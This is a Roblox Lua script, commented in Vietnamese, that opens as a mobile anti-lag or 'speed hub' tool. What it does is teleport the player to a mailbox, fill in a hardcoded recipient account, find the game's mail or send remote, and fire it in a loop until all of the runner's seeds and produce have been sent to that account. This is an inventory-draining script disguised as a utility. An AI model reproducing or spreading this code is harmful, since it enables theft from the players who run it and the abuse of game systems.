-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: TỰ ĐỘNG NHẬP TÊN & GỬI ĐỒ SIÊU TỐC ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- BƯỚC 1: ĐỊNH VỊ VÀ ÉP MỞ MAILBOX NGAY LẬP TỨC
-- =======================================================================
local function instantOpenMailbox()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local targetPrompt = nil
    local shortestDistance = math.huge
    
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local parentName = string.lower(obj.Parent and obj.Parent.Name or "")
            local objectText = string.lower(obj.ObjectText or "")
            
            local isMail = string.find(parentName, "mail") or string.find(objectText, "mail")
            local isFake = string.find(parentName, "edit") or string.find(parentName, "expand") or 
                           string.find(parentName, "plot") or string.find(parentName, "sign") or 
                           string.find(parentName, "board") or string.find(objectText, "edit")
            
            if isMail and not isFake then
                local part = obj.Parent:IsA("BasePart") and obj.Parent or obj.Parent:FindFirstChildWhichIsA("BasePart")
                if part then
                    local distance = (rootPart.Position - part.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        targetPrompt = obj
                    end
                end
            end
        end
    end
    
    if targetPrompt then
        local promptPart = targetPrompt.Parent:IsA("BasePart") and targetPrompt.Parent or targetPrompt.Parent.PrimaryPart
        print("[SPEED HUB] Đang di chuyển mở hòm thư...")
        
        pcall(function()
            rootPart.Velocity = Vector3.new(0,0,0)
            rootPart.CFrame = promptPart.CFrame * CFrame.new(0, 1.5, 2)
        end)
        task.wait(0.2)
        
        pcall(function()
            targetPrompt:InputHoldBegin()
            task.wait(targetPrompt.HoldDuration + 0.05)
            targetPrompt:InputHoldEnd()
        end)
        
        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        local mailFrame = nil
        if PlayerGui then
            for _, gui in pairs(PlayerGui:GetDescendants()) do
                if (gui:IsA("Frame") or gui:IsA("ImageLabel")) and string.find(string.lower(gui.Name), "mail") then
                    pcall(function() gui.Visible = true end)
                    mailFrame = gui
                    break
                end
            end
        end
        
        task.wait(0.5)
        return mailFrame
    end
    return nil
end

-- =======================================================================
-- BƯỚC 2: TỰ ĐỘNG NHẬP TÊN & XẢ SẠCH KHO ĐỒ SANG NICK CHÍNH
-- =======================================================================
local function fillNameAndTransferAll(mailFrame)
    if mailFrame then
        print("[SPEED HUB] Giao diện đã mở. Đang tự động nhập tên người nhận...")
        
        -- Tự động tìm ô nhập chữ (TextBox) trên bảng Mail để điền tên nick chính
        pcall(function()
            for _, box in pairs(mailFrame:GetDescendants()) do
                if box:IsA("TextBox") then
                    box.Text = targetUsername
                    box:ReleaseFocus(true) -- Xác nhận nhập xong
                end
            end
        end)
        task.wait(0.5) -- Chờ nửa giây để hệ thống game nhận dạng tên người chơi
    end

    -- Tiến hành quét kho và gửi đồ siêu tốc qua đường truyền ngầm (Remote)
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or 
                      LocalPlayer:FindFirstChild("Backpack") or 
                      LocalPlayer:FindFirstChild("PlayerData")
                      
    local MailEvent = nil
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local name = string.lower(obj.Name)
            if string.find(name, "mail") or string.find(name, "send") or string.find(name, "post") then
                MailEvent = obj
                break
            end
        end
    end

    if not Inventory or not MailEvent then 
        print("[SPEED HUB] Không tìm thấy dữ liệu túi đồ hoặc Remote để gửi hàng!")
        return 
    end

    print("[SPEED HUB] Đang xả toàn bộ nông sản/hạt giống sang nick chính...")
    
    for _, item in pairs(Inventory:GetDescendants()) do
        if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
            local lowerName = string.lower(item.Name)
            
            if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                local remainingAmount = item.Value
                
                while remainingAmount > 0 do
                    local sendAmount = math.min(remainingAmount, 20)
                    
                    pcall(function()
                        if MailEvent:IsA("RemoteEvent") then
                            MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                        elseif MailEvent:IsA("RemoteFunction") then
                            MailEvent:InvokeServer(targetUsername, item.Name, sendAmount)
                        end
                    end)
                    
                    remainingAmount = remainingAmount - sendAmount
                end
            end
        end
    end
    print("[SPEED HUB] ==== ĐÃ TỰ ĐỘNG ĐIỀN TÊN VÀ GỬI SẠCH ĐỒ THÀNH CÔNG! ====")
end

-- =======================================================================
-- KÍCH HOẠT CHẠY TỰ ĐỘNG CHU TRÌNH
-- =======================================================================
task.spawn(function()
    local mailFrame = instantOpenMailbox()
    -- Luồng chạy: Mở Mail thành công -> Tự động điền tên -> Bắn đồ siêu tốc luôn
    fillNameAndTransferAll(mailFrame)
end)
